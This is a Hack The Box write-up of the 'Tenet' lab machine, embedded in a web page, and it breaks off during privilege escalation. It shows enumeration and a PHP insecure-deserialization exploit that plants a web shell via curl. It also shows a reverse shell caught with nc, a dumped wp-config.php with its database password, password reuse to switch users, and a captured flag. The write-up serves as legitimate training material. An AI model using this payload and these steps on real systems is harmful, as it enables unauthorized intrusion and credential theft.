@@ -1,0 +1,641 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>HackTheBox - Tenet (medium) · MiguelRega7</title>
+<meta name="description" content="- Tenet is a Medium difficulty machine that features an Apache web server. It contains a Wordpress blog with a few posts. One of the comments on the blog mentions the presence of a"><meta name="theme-color" content="#070a0f">
+<link rel="icon" href="/favicon.ico"><link rel="stylesheet" href="/style.css">
+</head>
+<body>
+<header class="header"><div class="nav wrap">
+<a class="brand" href="/" aria-label="MiguelRega7">MR<em>7</em></a>
+<nav class="links"><a class="nav-link" data-nav="home" href="/">INICIO</a><a class="nav-link" data-nav="writeups" href="/#writeups">WRITEUPS</a><a class="nav-link" data-nav="about" href="/about/">ABOUT</a></nav>
+<div class="socials">
+<a href="https://github.com/MikeRega7" target="_blank" rel="noreferrer" aria-label="GitHub"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M12 .7a11.5 11.5 0 0 0-3.64 22.4c.58.1.79-.25.79-.56v-2.04c-3.2.7-3.87-1.35-3.87-1.35-.52-1.32-1.27-1.67-1.27-1.67-1.04-.71.08-.7.08-.7 1.15.08 1.75 1.18 1.75 1.18 1.02 1.74 2.67 1.24 3.32.95.1-.74.4-1.24.72-1.53-2.55-.29-5.24-1.28-5.24-5.7 0-1.26.45-2.29 1.18-3.1-.12-.3-.51-1.46.11-3.05 0 0 .96-.31 3.15 1.18a10.9 10.9 0 0 1 5.73 0c2.19-1.49 3.15-1.18 3.15-1.18.62 1.59.23 2.75.11 3.05.74.81 1.18 1.84 1.18 3.1 0 4.43-2.7 5.4-5.26 5.69.41.35.77 1.04.77 2.1v3.07c0 .31.21.67.8.55A11.5 11.5 0 0 0 12 .7Z"/></svg></a>
+<a href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" rel="noreferrer" aria-label="LinkedIn"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M5.2 3.2A2.2 2.2 0 1 1 5.2 7.6a2.2 2.2 0 0 1 0-4.4ZM3.4 8.9h3.6V20H3.4V8.9Zm5.8 0h3.4v1.52h.05c.47-.9 1.62-1.84 3.34-1.84 3.57 0 4.23 2.35 4.23 5.4V20h-3.55v-5.34c0-1.27-.02-2.91-1.77-2.91-1.78 0-2.05 1.39-2.05 2.82V20H9.2V8.9Z"/></svg></a>
+<a href="https://www.instagram.com/_miguelitornuno7" target="_blank" rel="noreferrer" aria-label="Instagram"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="1.8" d="M7 2.9h10A4.1 4.1 0 0 1 21.1 7v10a4.1 4.1 0 0 1-4.1 4.1H7A4.1 4.1 0 0 1 2.9 17V7A4.1 4.1 0 0 1 7 2.9Z"/><circle cx="12" cy="12" r="3.3" fill="none" stroke="currentColor" stroke-width="1.8"/><circle cx="17.5" cy="6.7" r=".9" fill="currentColor"/></svg></a>
+
+</div><button class="menu" type="button" aria-label="Abrir menú" aria-expanded="false">☰</button>
+</div></header>
+<main class="wrap"><header class="article-head"><a class="back" href="/#writeups">← VOLVER A WRITEUPS</a><div class="article-head-row"><div><span class="article-tag">Hack The Box</span><h1>HackTheBox - Tenet (medium)</h1><div class="meta"><span>◷</span><time>2024-07-03</time><span>·</span><span>WRITEUP</span><span>·</span><span>MR7 LAB</span></div></div><div class="share"><span>Compartir</span><button type="button" class="share-btn" data-copy-url="true">↗</button></div></div><p class="article-excerpt">- Tenet is a Medium difficulty machine that features an Apache web server. It contains a Wordpress blog with a few posts. One of the comments on the blog mentions the presence of a.</p></header><div class="article-layout"><aside class="aside"><div class="aside-title">CONTENIDO</div><a href="#portscan">PortScan</a><a href="#enumeration">Enumeration</a><a href="#shell-as-www-data">Shell as www-data</a><a href="#neil-shell">neil shell</a><a href="#user-txt">User.txt</a><a href="#privilege-escalation">Privilege Escalation</a><a href="#shell-as-root-and-root-txt">Shell as root and root.txt</a></aside><article class="article-content" id="top"><p align="center">
+<img src="https://labs.hackthebox.com/storage/avatars/6bd8b01a1b84e16a5ee2e53d070339fd.png">
+</p>
+
+<ul>
+<li>Tenet is a Medium difficulty machine that features an Apache web server. It contains a Wordpress blog with a few posts. One of the comments on the blog mentions the presence of a PHP file along with it's backup. It is possible after identificaiton of the backup file to review it's source code. The code in PHP file is vulnerable to an insecure deserialisation vulnerability and by successful exploiting it a foothold on the system is achieved. While enumerating the system it was found that the Wordpress configuration file can be read and thus gaining access to a set of credentials. By using them we can move laterally from user <code>www-data</code> to user <code>Neil</code>. Further system enumeration reveals that this user have root permissions to run a bash script through <code>sudo</code>. The script is writing SSH public keys to the <code>authorized_keys</code> file of the <code>root</code> user and is vulnerable to a race condition. After successful exploitation, attackers can write their own SSH keys to the <code>authorized_keys</code> file and use them to login to the system as <code>root</code>.</li>
+</ul>
+<h2 id="portscan">PortScan</h2>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ cat ../nmap/targeted
+# Nmap 7.94SVN scan initiated Wed Jul  3 16:55:09 2024 as: nmap -sCV -p22,80 -oN targeted 10.10.10.223
+Nmap scan report for 10.10.10.223
+Host is up (0.12s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA)
+|   256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA)
+|_  256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+<ul>
+<li>We see that a <strong>Wordpress</strong> is being used as a content management system.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ cat ../nmap/webScan
+# Nmap 7.94SVN scan initiated Wed Jul  3 16:57:31 2024 as: nmap --script=http-enum -p80 -oN webScan 10.10.10.223
+Nmap scan report for 10.10.10.223
+Host is up (0.11s latency).
+
+PORT   STATE SERVICE
+80/tcp open  http
+| http-enum:
+|_  /wordpress/wp-login.php: Wordpress login page.
+</code></pre></div></div>
+<h2 id="enumeration">Enumeration</h2>
+<ul>
+<li>We see the technologies that are being used in the web service.</li>
+</ul>
+<div class="code-window" data-language="Ruby"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Ruby</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-ruby">❯ whatweb http://10.10.10.223
+http://10.10.10.223 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.223], Title[Apache2 Ubuntu Default Page: It works]
+</code></pre></div></div>
+<ul>
+<li>If we go to see the web page as such we find this.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/tenet/1.png">
+</p>
+
+<ul>
+<li>But if we go to the route reported by <code>Nmap</code> we can see the <strong>Wordpress</strong>.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/tenet/2.png">
+</p>
+
+<ul>
+<li>We can see the subdomain <code>tenet.htb</code>.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/tenet/3.png">
+</p>
+
+<ul>
+<li>So what we are going to do is to add it to <code>/etc/hosts</code> so that the resources are displayed correctly.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ echo &quot;10.10.10.223 tenet.htb&quot; | sudo tee -a /etc/hosts
+10.10.10.223 tenet.htb
+</code></pre></div></div>
+<ul>
+<li>Now it works.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/tenet/4.png">
+</p>
+
+<ul>
+<li>We are going <strong>Fuzzing</strong> to see if we can find any interesting routes.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ gobuster dir -u http://tenet.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 --no-error -x php -s 200
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://tenet.htb/
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php
+[+] Timeout:                 10s
+===============================================================
+2023/07/25 19:56:01 Starting gobuster in directory enumeration mode
+===============================================================
+/index.php            (Status: 301) [Size: 0] [--&gt; http://tenet.htb/]
+/wp-content           (Status: 301) [Size: 311] [--&gt; http://tenet.htb/wp-content/]
+/wp-login.php         (Status: 200) [Size: 6534]                                  
+/wp-includes          (Status: 301) [Size: 312] [--&gt; http://tenet.htb/wp-includes/]
+/wp-trackback.php     (Status: 200) [Size: 135]                                    
+/wp-admin             (Status: 301) [Size: 309] [--&gt; http://tenet.htb/wp-admin/]   
+/xmlrpc.php           (Status: 405) [Size: 42]                                     
+/wp-signup.php        (Status: 302) [Size: 0] [--&gt; http://tenet.htb/wp-login.php?action=register]
+/server-status        (Status: 403) [Size: 274]                                                  
+                                                                                                 
+===============================================================
+2024/07/03 18:07:30 Finished
+===============================================================
+</code></pre></div></div>
+<ul>
+<li><p>They are the typical wordpress routes but here we find something interesting.</p>
+</li>
+<li><p>Version 5.6.</p>
+</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/tenet/5.png">
+</p>
+
+<ul>
+<li>We see the file.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/tenet/6.png">
+</p>
+
+<ul>
+<li>We don't see anything interesting so far let's fuzzing but now to search for subdomains.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ gobuster vhost -u http://tenet.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 50 --no-error
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:          http://tenet.htb
+[+] Method:       GET
+[+] Threads:      50
+[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+[+] User Agent:   gobuster/3.1.0
+[+] Timeout:      10s
+===============================================================
+2024/07/03 18:30:50 Starting gobuster in VHOST enumeration mode
+===============================================================
+Found: www.tenet.htb (Status: 301) [Size: 0]
+</code></pre></div></div>
+<ul>
+<li>We add it to <code>/etc/hosts</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ cat /etc/hosts | tail -n 1
+10.10.10.223 tenet.htb www.tenet.htb
+</code></pre></div></div>
+<ul>
+<li>But it redirects us to the domain that we already have.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/tenet/7.png">
+</p>
+
+<ul>
+<li>If we analyze a <strong>post</strong> of those on the web there is one which is called <strong>Migration</strong> and if we analyze it we see that there is a comment from the user <strong>neil</strong>.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/tenet/8.png">
+</p>
+
+<ul>
+<li>There is a path called <code>sator.php</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ curl -s http://tenet.htb/sator.php
+&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;404 Not Found&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.29 (Ubuntu) Server at tenet.htb Port 80&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;
+</code></pre></div></div>
+<ul>
+<li>If we try setting the <code>IP</code> we can see that the situation changes.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ curl -s http://10.10.10.223/sator.php
+[+] Grabbing users from text file &lt;br&gt;
+[] Database updated &lt;br&gt;
+</code></pre></div></div>
+<ul>
+<li>Something that was mentioned in the comments was about a <code>backup</code> so if we add to the path we have <code>.bak</code> we see that it exists as such.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ curl -s http://10.10.10.223/sator.php.bak
+&lt;?php
+
+class DatabaseExport
+{
+	public $user_file = 'users.txt';
+	public $data = '';
+
+	public function update_db()
+	{
+		echo '[+] Grabbing users from text file &lt;br&gt;';
+		$this-&gt; data = 'Success';
+	}
+
+
+	public function __destruct()
+	{
+		file_put_contents(__DIR__ . '/' . $this -&gt;user_file, $this-&gt;data);
+		echo '[] Database updated &lt;br&gt;';
+	//	echo 'Gotta get this working properly...';
+	}
+}
+
+$input = $_GET['arepo'] ?? '';
+$databaseupdate = unserialize($input);
+
+$app = new DatabaseExport;
+$app -&gt; update_db();
+
+
+?&gt;
+</code></pre></div></div>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/tenet/9.png">
+</p>
+
+<h2 id="shell-as-www-data">Shell as www-data</h2>
+<h1>PHP Deserialization Attack</h1>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/tenet/web10.png">
+</p>
+
+<ul>
+<li><p>Well as such they are letting us control our <code>input</code> which is processed by <strong>GET</strong> and as such is not applying sanitization and as such is employing the <code>arepo</code> parameter we are going to create a serealized data.</p>
+</li>
+<li><p>We are going to create a <strong>script in php</strong> to give us the <code>serialized</code> data since by means of the <code>cmd</code> parameter we are going to execute commands.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ catn serialize.php
+&lt;?php
+class DatabaseExport
+{
+        public $user_file = 'xd.php';
+        public $data = '&lt;?php system($_REQUEST[&quot;cmd&quot;]); ?&gt;';
+}
+
+$pwned = new DatabaseExport;
+echo serialize($pwned);
+?&gt;
+</code></pre></div></div>
+<ul>
+<li>If we execute it we get the object <code>serealized</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ php serialize.php 2&gt;/dev/null; echo
+O:14:&quot;DatabaseExport&quot;:2:{s:9:&quot;user_file&quot;;s:6:&quot;xd.php&quot;;s:4:&quot;data&quot;;s:34:&quot;&lt;?php system($_REQUEST[&quot;cmd&quot;]); ?&gt;&quot;;}
+</code></pre></div></div>
+<ul>
+<li>We are going to send it all the data through the <code>arepo</code> parameter which is not sanitized and will interpret what we pass it since it is going to be derealized.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ curl -s -X GET -G &quot;http://10.10.10.223/sator.php&quot; --data-urlencode 'arepo=O:14:&quot;DatabaseExport&quot;:2:{s:9:&quot;user_file&quot;;s:6:&quot;xd.php&quot;;s:4:&quot;data&quot;;s:34:&quot;&lt;?php system($_REQUEST[&quot;cmd&quot;]); ?&gt;&quot;;}'; echo
+[+] Grabbing users from text file &lt;br&gt;
+[] Database updated &lt;br&gt;[] Database updated &lt;br&gt;
+</code></pre></div></div>
+<ul>
+<li>We see that the <code>xd.php</code> file that we defined in the <code>script</code> was created correctly.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/tenet/rev.png">
+</p>
+
+<ul>
+<li>And now we can execute commands.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/tenet/rev2.png">
+</p>
+
+<ul>
+<li>Now we gain access to the system by sending us a <code>reverse shell</code>..</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/tenet/rev3.png">
+</p>
+
+<ul>
+<li>Now we receive the shell.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.14.63] from (UNKNOWN) [10.10.10.223] 49860
+bash: cannot set terminal process group (1678): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@tenet:/var/www/html$ whoami
+whoami
+www-data
+www-data@tenet:/var/www/html$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, file is /dev/null
+www-data@tenet:/var/www/html$ ^Z
+[1]  + 37998 suspended  nc -nlvp 443
+❯ stty raw -echo; fg
+[1]  + 37998 continued  nc -nlvp 443
+                                    reset xterm
+ENTER
+www-data@tenet:/var/www/html$ export TERM=xterm
+</code></pre></div></div>
+<h2 id="neil-shell">neil shell</h2>
+<ul>
+<li>We found credentials..</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">www-data@tenet:/var/www/html/wordpress$ ls -la
+total 228
+drwxr-xr-x  5 www-data www-data  4096 Jul  3 22:57 .
+drwxr-xr-x  3 www-data www-data  4096 Jul  4 00:32 ..
+-rw-r--r--  1 www-data www-data   405 Feb  6  2020 index.php
+-rw-r--r--  1 www-data www-data 19915 Feb 12  2020 license.txt
+-rw-r--r--  1 www-data www-data  7278 Jun 26  2020 readme.html
+-rw-r--r--  1 www-data www-data  7101 Jul 28  2020 wp-activate.php
+drwxr-xr-x  9 www-data www-data  4096 Dec  8  2020 wp-admin
+-rw-r--r--  1 www-data www-data   351 Feb  6  2020 wp-blog-header.php
+-rw-r--r--  1 www-data www-data  2328 Oct  8  2020 wp-comments-post.php
+-rw-r--r--  1 www-data www-data  2913 Feb  6  2020 wp-config-sample.php
+-rw-r--r--  1 www-data www-data  3185 Jan  7  2021 wp-config.php
+drwxr-xr-x  5 www-data www-data  4096 Jul  3 22:57 wp-content
+-rw-r--r--  1 www-data www-data  3939 Jul 30  2020 wp-cron.php
+drwxr-xr-x 25 www-data www-data 12288 Dec  8  2020 wp-includes
+-rw-r--r--  1 www-data www-data  2496 Feb  6  2020 wp-links-opml.php
+-rw-r--r--  1 www-data www-data  3300 Feb  6  2020 wp-load.php
+-rw-r--r--  1 www-data www-data 49831 Nov  9  2020 wp-login.php
+-rw-r--r--  1 www-data www-data  8509 Apr 14  2020 wp-mail.php
+-rw-r--r--  1 www-data www-data 20975 Nov 12  2020 wp-settings.php
+-rw-r--r--  1 www-data www-data 31337 Sep 30  2020 wp-signup.php
+-rw-r--r--  1 www-data www-data  4747 Oct  8  2020 wp-trackback.php
+-rw-r--r--  1 www-data www-data  3236 Jun  8  2020 xmlrpc.php
+www-data@tenet:/var/www/html/wordpress$ cat wp-config.php
+&lt;?php
+/**
+ * The base configuration for WordPress
+ *
+ * The wp-config.php creation script uses this file during the
+ * installation. You don't have to use the web site, you can
+ * copy this file to &quot;wp-config.php&quot; and fill in the values.
+ *
+ * This file contains the following configurations:
+ *
+ * * MySQL settings
+ * * Secret keys
+ * * Database table prefix
+ * * ABSPATH
+ *
+ * @link https://wordpress.org/support/article/editing-wp-config-php/
+ *
+ * @package WordPress
+ */
+
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define( 'DB_NAME', 'wordpress' );
+
+/** MySQL database username */
+define( 'DB_USER', 'neil' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', 'Opera2112' );
+
+/** MySQL hostname */
+define( 'DB_HOST', 'localhost' );
+
+/** Database Charset to use in creating database tables. */
+define( 'DB_CHARSET', 'utf8mb4' );
+
+/** The Database Collate type. Don't change this if in doubt. */
+define( 'DB_COLLATE', '' );
+
+define( 'WP_HOME', 'http://tenet.htb');
+define( 'WP_SITEURL', 'http://tenet.htb');
+
+/**#@+
+ * Authentication Unique Keys and Salts.
+ *
+ * Change these to different unique phrases!
+ * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
+ * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
+ *
+ * @since 2.6.0
+ */
+define( 'AUTH_KEY',         'QiuK;~(mBy7H3y8G;*|^*vGekSuuxKV$:Tc&gt;5qKr`T}(t?+`r.+`gg,Ul,=!xy6d' );
+define( 'SECURE_AUTH_KEY',  'x3q&amp;hwYy]:S{l;jDU0D&amp;./@]GbBz(P~}]y=3deqO1ZB/`P:GU&lt;tJ[v)4&gt;&lt;}wl_~N' );
+define( 'LOGGED_IN_KEY',    'JrJ_u34gQ3(x7y_Db8`9%@jq&lt;;{aqQk(Z+uZ|}M,l?6.~Fo/~Tr{0bJIW?@.*|Nu' );
+define( 'NONCE_KEY',        '=z0ODLKO{9K;&lt;,&lt;gT[f!y_*1QgIc;#FoN}pvHNP`|hi/;cwK=vCwcC~nz&amp;0:ajW#' );
+define( 'AUTH_SALT',        '*.;XACYRMNvA?.r)f~}+A,eMke?/i^O6j$vhZA&lt;E5Vp#N[a{YL TY^-Q[X++u@Ab' );
+define( 'SECURE_AUTH_SALT', 'NtFPN?_NXFqW-Bm6Jv,v-KkjS^8Hz@BIcxc] F}(=v1$B@F/j(`b`7{A$T{DG|;h' );
+define( 'LOGGED_IN_SALT',   'd14m0mBP eIawFxLs@+CrJz#d(88cx4||&lt;6~_U3F=aCCiyN|]Hr{(mC5&lt; R57zmn' );
+define( 'NONCE_SALT',       'Srtt&amp;}(~:K(R(q(FMK&lt;}}%Zes!4%!S`V!KSk)Rlq{&gt;Y?f&amp;b`&amp;NW[INM2,a9Zm,SH' );
+
+/**#@-*/
+
+/**
+ * WordPress Database Table prefix.
+ *
+ * You can have multiple installations in one database if you give each
+ * a unique prefix. Only numbers, letters, and underscores please!
+ */
+$table_prefix = 'wp_';
+
+/**
+ * For developers: WordPress debugging mode.
+ *
+ * Change this to true to enable the display of notices during development.
+ * It is strongly recommended that plugin and theme developers use WP_DEBUG
+ * in their development environments.
+ *
+ * For information on other constants that can be used for debugging,
+ * visit the documentation.
+ *
+ * @link https://wordpress.org/support/article/debugging-in-wordpress/
+ */
+define( 'WP_DEBUG', false );
+
+/* That's all, stop editing! Happy publishing. */
+
+/** Absolute path to the WordPress directory. */
+if ( ! defined( 'ABSPATH' ) ) {
+	define( 'ABSPATH', __DIR__ . '/' );
+}
+
+/** Sets up WordPress vars and included files. */
+require_once ABSPATH . 'wp-settings.php'; 
+</code></pre></div></div>
+<ul>
+<li>The credentials are for the database but as such if we try to migrate to the <code>neil</code> user we see that <code>Opera2112</code> works.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">www-data@tenet:/var/www/html/wordpress$ su neil
+Password: 
+neil@tenet:/var/www/html/wordpress$ whoami
+neil
+neil@tenet:/var/www/html/wordpress$ id
+uid=1001(neil) gid=1001(neil) groups=1001(neil)
+neil@tenet:/var/www/html/wordpress$ 
+</code></pre></div></div>
+<h2 id="user-txt">User.txt</h2>
+<ul>
+<li>Here we can see the first flag.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">neil@tenet:~$ cat user.txt
+0b85a9967e410892bb32b0628e11989f
+neil@tenet:~$
+</code></pre></div></div>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<ul>
+<li>We have this privilege at the <code>sudoers</code> level.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">neil@tenet:~$ sudo -l
+Matching Defaults entries for neil on tenet:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:
+
+User neil may run the following commands on tenet:
+    (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh
+neil@tenet:~$ 
+</code></pre></div></div>
+<ul>
+<li>If we run it we see this.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">neil@tenet:~$ sudo /usr/local/bin/enableSSH.sh
+Successfully added root@ubuntu to authorized_keys file!
+neil@tenet:~$ 
+</code></pre></div></div>
+<ul>
+<li>We see this.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">neil@tenet:~$ cat /usr/local/bin/enableSSH.sh
+#!/bin/bash
+
+checkAdded() {
+
+	sshName=$(/bin/echo $key | /usr/bin/cut -d &quot; &quot; -f 3)
+
